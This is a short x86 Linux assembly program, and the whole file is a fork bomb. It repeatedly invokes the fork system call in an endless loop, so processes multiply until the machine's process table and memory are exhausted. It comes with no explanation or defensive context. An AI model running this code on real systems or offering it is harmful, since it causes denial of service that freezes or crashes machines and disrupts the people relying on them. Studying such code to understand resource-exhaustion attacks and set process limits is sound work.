SYS_FORK equ		0x2

global _start

section .text

_start:
	; fork(void);
	xor eax, eax
	mov al, SYS_FORK
	int 0x80
	jmp _start
